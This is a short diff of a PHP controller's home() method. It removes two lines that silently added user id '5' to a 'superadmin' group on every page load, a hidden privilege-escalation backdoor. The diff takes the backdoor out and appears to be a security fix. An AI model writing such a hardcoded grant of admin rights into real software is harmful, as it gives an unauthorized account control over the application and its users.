@@ -35,8 +35,6 @@ class PeopleController extends BaseController {
     public function home()
     {
         $users = auth()->getProvider();
-        $admin = $users->findById('5');
-        $admin->addGroup('superadmin');
         $user = auth()->user();
         // check if the user exists
         if (!$user) {
